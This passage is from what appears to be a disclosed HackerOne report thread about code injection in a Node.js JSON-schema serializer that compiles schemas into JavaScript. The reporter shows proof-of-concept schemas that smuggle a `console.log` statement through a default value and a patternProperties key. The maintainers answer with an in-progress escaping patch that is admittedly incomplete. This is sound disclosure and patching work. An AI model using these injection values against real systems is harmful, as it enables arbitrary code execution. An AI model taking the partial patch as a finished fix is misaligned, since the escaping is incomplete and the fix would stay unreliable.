class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)\n+        throw new Error(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"nx\"\u003eis\u003c/span\u003e \u003cspan class=\"nx\"\u003erequired\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)\n       `\n     }\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-04-11T19:53:34.831Z","updated_at":"2019-04-11T19:53:34.831Z","actor":{"username":"mcollina","cleared":false,"url":"/mcollina","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/230/980/61a26e6fa4ec002fca494b3b7b43aa251eef3453_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4543674,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I checked the proposed patch. We are on the right track, but I could identify some other edge cases: (not sure if these are all of them)\n\n- default properties\n\n```javascript\n  properties: {\n      phra: {\n        type: 'string',\n        default: 'a\\'\u0026\u0026(console.log(\\'w00tw00t\\'))||\\''\n      },\n  ...\n```\n\n- pattern properties\n\n```javascript\n  patternProperties: {\n    'phra\\'/ \u0026\u0026 console.log(\"w00tw00t\") \u0026\u0026 /\\'': {\n      type: 'number'\n    }\n  },\n````\n\nFor the rest, I am worried about arrays, nested fields and `if/then/else` jsonschema feature (and eventual combinations of these cases) but I don't have a working POC for them.","markdown_message":"\u003cp\u003eI checked the proposed patch. We are on the right track, but I could identify some other edge cases: (not sure if these are all of them)\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003edefault properties\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e  \u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003ephra\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n        \u003cspan class=\"k\"\u003edefault\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ea\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;\u0026amp;(console.log(\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ew00tw00t\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e))||\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n      \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003epattern properties\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e  \u003cspan class=\"nx\"\u003epatternProperties\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ephra\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/ \u0026amp;\u0026amp; console.log(\u0026quot;w00tw00t\u0026quot;) \u0026amp;\u0026amp; /\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"nl\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enumber\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eFor the rest, I am worried about arrays, nested fields and \u003ccode\u003eif/then/else\u003c/code\u003e jsonschema feature (and eventual combinations of these cases) but I don\u0026#39;t have a working POC for them.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-04-12T00:03:11.281Z","updated_at":"2019-04-12T00:03:11.281Z","actor":{"username":"phra","cleared":false,"url":"/phra","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/201/213/71f68147b3cb0e1d6e7e39953fc2c4822d04d338_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4545086,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Latest patch, let me know if you can find more.\n\n```js\ndiff --git a/index.js b/index.js\nindex b6bbe4f..f9c9e30 100644\n--- a/index.js\n+++ b/index.js\n@@ -119,6 +119,8 @@ function build (schema, options) {\n   }\n \n   dependenciesName.push(code)\n+\n+  console.log(code)\n   return (Function.apply(null, dependenciesName).apply(null, dependencies))\n }\n \n@@ -301,7 +303,7 @@ function addPatternProperties (schema, externalSchema, fullSchema) {\n     }\n     var type = pp[regex].type\n     code += `\n-        if (/${regex}/.test(keys[i])) {\n+        if (/${regex.replace(/([^\\\\]+\\/)/g, '\\\\/')}/.test(keys[i])) {\n     `\n     if (type === 'object') {\n       code += buildObject(pp[regex], '', 'buildObjectPP' + index, externalSchema, fullSchema)\n@@ -491,6 +493,10 @@ function refFinder (ref, schema, externalSchema) {\n   return (new Function('schema', code))(schema)\n }\n \n+function sanitizeKey (key) {\n+  return key.replace(/([^\\\\])\\'/g, '$1\\\\\\'')\n+}\n+\n function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n   Object.keys(schema.properties || {}).forEach((key, i, a) =\u003e {\n     if (schema.properties[key]['$ref']) {\n@@ -502,12 +508,13 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     var type = schema.properties[key].type\n     var nullable = schema.properties[key].nullable\n+    var sanitized = sanitizeKey(key)\n \n     if (nullable) {\n       code += `\n-        if (obj['${key}'] === null) {\n+        if (obj['${sanitized}'] === null) {\n           ${addComma}\n-          json += '${$asString(key)}:null'\n+          json += '${$asString(sanitized)}:null'\n           var rendered = true\n         } else {\n       `\n@@ -515,10 +522,10 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n \n     if (type === 'number') {\n       code += `\n-          var t = Number(obj['${key}'])\n+          var t = Number(obj['${sanitized}'])\n           if (!isNaN(t)) {\n             ${addComma}\n-            json += '${$asString(key)}:' + t\n+            json += '${$asString(sanitized)}:' + t\n       `\n     } else if (type === 'integer') {\n       code += `\n@@ -526,25 +533,25 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n       if (isLong) {\n         code += `\n-            if (isLong(obj['${key}'])) {\n+            if (isLong(obj['${sanitized}'])) {\n               ${addComma}\n-              json += '${$asString(key)}:' + obj['${key}'].toString()\n+              json += '${$asString(sanitized)}:' + obj['${sanitized}'].toString()\n               rendered = true\n             } else {\n-              var t = Number(obj['${key}'])\n+              var t = Number(obj['${sanitized}'])\n               if (!isNaN(t)) {\n                 ${addComma}\n-                json += '${$asString(key)}:' + t\n+                json += '${$asString(sanitized)}:' + t\n                 rendered = true\n               }\n             }\n         `\n       } else {\n         code += `\n-            var t = Number(obj['${key}'])\n+            var t = Number(obj['${sanitized}'])\n             if (!isNaN(t)) {\n               ${addComma}\n-              json += '${$asString(key)}:' + t\n+              json += '${$asString(sanitized)}:' + t\n               rendered = true\n             }\n         `\n@@ -554,7 +561,7 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       `\n     } else {\n       code += `\n-        if (obj['${key}'] !== undefined) {\n+        if (obj['${sanitized}'] !== undefined) {\n           ${addComma}\n           json += '${$asString(key)}:'\n         `\n@@ -569,12 +576,12 @@ function buildCode (schema, code, laterCode, name, externalSchema, fullSchema) {\n       code += `\n       } else {\n         ${addComma}\n-        json += '${$asString(key)}:${JSON.stringify(defaultValue).replace(/'/g, '\\'')}'\n+        json += '${$asString(sanitized)}:${sanitizeKey(JSON.stringify(defaultValue)).replace(/'/g, '\\'')}'\n       `\n     } else if (schema.required \u0026\u0026 schema.required.indexOf(key) !== -1) {\n       code += `\n       } else {\n-        throw new Error('${key} is required!')\n+        throw new Error('${sanitized} is required!')\n       `\n     }\n ```","markdown_message":"\u003cp\u003eLatest patch, let me know if you can find more.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003ediff\u003c/span\u003e \u003cspan class=\"o\"\u003e--\u003c/span\u003e\u003cspan class=\"nx\"\u003egit\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e \u003cspan class=\"nx\"\u003eb6bbe4f\u003c/span\u003e\u003cspan class=\"p\"\u003e..\u003c/span\u003e\u003cspan class=\"nx\"\u003ef9c9e30\u003c/span\u003e \u003cspan class=\"mi\"\u003e100644\u003c/span\u003e\n\u003cspan class=\"o\"\u003e---\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+++\u003c/span\u003e \u003cspan class=\"nx\"\u003eb\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e119\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e119\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuild\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eoptions\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n   \u003cspan class=\"nx\"\u003edependenciesName\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e  \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n   \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edependenciesName\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eapply\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003edependencies\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e301\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e303\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e7\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003eaddPatternProperties\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n     \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n     \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epp\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eregex\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\n     \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`\n-        if (/\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eregex\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/.test(keys[i])) {\n+        if (/\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eregex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e([^\\\\]\u003c/span\u003e\u003cspan class=\"sr\"\u003e+\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/)\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\u003c/span\u003e\u003cspan class=\"s1\"\u003e/\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)}\u003c/span\u003e\u003cspan class=\"s2\"\u003e/.test(keys[i])) {\n     `\u003c/span\u003e\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eobject\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n       \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildObject\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epp\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003eregex\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ebuildObjectPP\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e491\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e493\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003erefFinder\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eref\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nb\"\u003eFunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eschema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e))(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e([^\\\\])\\\u0026#39;\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$1\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\\\\\u0026#39;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e\n \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n   \u003cspan class=\"nb\"\u003eObject\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ekeys\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e{}).\u003c/span\u003e\u003cspan class=\"nx\"\u003eforEach\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ei\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ea\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e$ref\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e502\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e12\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"mi\"\u003e508\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"mi\"\u003e13\u003c/span\u003e \u003cspan class=\"p\"\u003e@@\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003ebuildCode\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003elaterCode\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eexternalSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003efullSchema\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n     \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etype\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003etype\u003c/span\u003e\n     \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003enullable\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eschema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eproperties\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003enullable\u003c/span\u003e\n\u003cspan class=\"o\"\u003e+\u003c/span\u003e    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitized\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitizeKey\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n     \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan 